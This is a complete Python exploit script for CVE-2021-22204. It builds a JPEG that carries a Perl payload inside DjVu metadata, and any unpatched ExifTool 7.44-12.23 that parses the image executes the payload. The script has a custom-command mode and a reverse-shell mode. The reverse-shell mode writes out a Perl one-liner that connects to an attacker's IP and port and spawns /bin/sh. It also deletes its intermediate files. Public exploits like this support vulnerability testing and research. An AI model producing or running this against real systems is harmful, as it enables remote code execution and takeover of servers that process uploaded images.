#!/usr/bin/env python3
# Exploit Title: ExifTool 7.44-12.23 - Arbitrary Code Execution
# Date: 04/30/2022
# Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
# Vendor Homepage: https://exiftool.org/
# Software Link: https://github.com/exiftool/exiftool/archive/refs/tags/12.23.zip
# Version: 7.44-12.23
# Tested on: ExifTool 12.23 (Debian)
# CVE: CVE-2021-22204
# Source: https://github.com/UNICORDev/exploit-CVE-2021-22204
# Description: Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image

# Imports
import base64
import os
import subprocess
import sys
import time

# Class for colors
class color:
    red = '\033[91m'
    gold = '\033[93m'
    blue = '\033[36m'
    green = '\033[92m'
    no = '\033[0m'

# Print UNICORD ASCII Art
def UNICORD_ASCII():
    print(rf"""
{color.red}        _ __,~~~{color.gold}/{color.red}_{color.no}        {color.blue}__  ___  _______________  ___  ___{color.no}
{color.red}    ,~~`( )_( )-\|       {color.blue}/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \{color.no}
{color.red}        |/|  `--.       {color.blue}/ /_/ /    // // /__/ /_/ / , _/ // /{color.no}
{color.green}_V__v___{color.red}!{color.green}_{color.red}!{color.green}__{color.red}!{color.green}_____V____{color.blue}\____/_/|_/___/\___/\____/_/|_/____/{color.green}....{color.no}
    """)

# Print exploit help menu
def help():
    print(r"""UNICORD Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.
""")

def loading(spins):

    def spinning_cursor():
        while True:
            for cursor in '|/-\\':
                yield cursor

    spinner = spinning_cursor()
    for _ in range(spins):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')

# Check for dependencies
def dependencies():

    deps = {'bzz':"sudo apt install djvulibre-bin",'djvumake':"sudo apt install djvulibre-bin",'exiftool':"sudo apt install exiftool"}
    missingDep = False

    for dep in deps:
        if subprocess.call(['which',dep],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT) == 1:
            print(f"{color.blue}ERRORED: {color.red}Missing dependency \"{dep}\". Try: \"{deps[dep]}\"{color.no}")
            missingDep = True

    if missingDep is True:
        exit()

# Run the exploit
def exploit(command):

    UNICORD_ASCII()

    # Create perl payload
    payload = "(metadata \"\c${"
    payload += command
    payload += "};\")"

    print(f"{color.blue}UNICORD: {color.red}Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution{color.no}")
    print(f"{color.blue}PAYLOAD: {color.gold}" + payload + f"{color.no}")
    loading(15)

    # Check for dependencies
    dependencies()

    print(f"{color.blue}DEPENDS: {color.gold}Dependencies for exploit are met!{color.no}")

    loading(15)

    # Write payload to file
    payloadFile = open('payload','w')
    payloadFile.write(payload)
    payloadFile.close()

    print(f"{color.blue}PREPARE: {color.gold}Payload written to file!{color.no}")

    # Bzz compress file
    subprocess.run(['bzz', 'payload', 'payload.bzz'])

    print(f"{color.blue}PREPARE: {color.gold}Payload file compressed!{color.no}")

    # Run djvumake
    subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])

    print(f"{color.blue}PREPARE: {color.gold}DjVu file created!{color.no}")

    # Process custom image file
    if '-i' in sys.argv:
        imagePath = sys.argv[sys.argv.index('-i') + 1]
        subprocess.run(['cp',f'{imagePath}','./image.jpg','-n'])

    else:
        # Smallest possible JPEG
        image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="

        # Write smallest possible JPEG image to file
        with open("image.jpg", "wb") as img:
            img.write(base64.decodebytes(image))

    print(f"{color.blue}PREPARE: {color.gold}JPEG image created/processed!{color.no}")

    # Write exiftool config to file
    config = (r"""
    %Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
    },
    );
    1; #end
    """)
    configFile = open('exiftool.config','w')
    configFile.write(config)
    configFile.close()

    print(f"{color.blue}PREPARE: {color.gold}Exiftool config written to file!{color.no}")

    loading(15)

    # Exiftool config for output image
    subprocess.run(['exiftool','-config','exiftool.config','-HasselbladExif<=exploit.djvu','image.jpg','-overwrite_original_in_place','-q'])

    print(f"{color.blue}EXPLOIT: {color.gold}Payload injected into image!{color.no}")

    # Delete leftover files
    os.remove("payload")
    os.remove("payload.bzz")
    os.remove("exploit.djvu")
    os.remove("exiftool.config")
    if os.path.exists("image.jpg_exiftool_tmp"):
        os.remove("image.jpg_exiftool_tmp")

    print(f"{color.blue}CLEANUP: {color.gold}Old file artifacts deleted!{color.no}")

    loading(15)

    # Print results
    print(f"{color.blue}SUCCESS: {color.green}Exploit image written to \"{color.gold}image.jpg{color.green}\"{color.no}\n")

    exit()

if __name__ == "__main__":

    args = ['-h','-c','-s','-i']

    if args[0] in sys.argv:
        help()

    elif args[1] in sys.argv and not args[2] in sys.argv:
        exec = sys.argv[sys.argv.index(args[1]) + 1]
        command = f"system(\'{exec}\')"
        exploit(command)

    elif args[2] in sys.argv and not args[1] in sys.argv:
        localIP = sys.argv[sys.argv.index(args[2]) + 1]
        localPort = sys.argv[sys.argv.index(args[2]) + 2]
        command = f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({localPort},inet_aton('{localIP}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};"
        exploit(command)

    else:
        help()
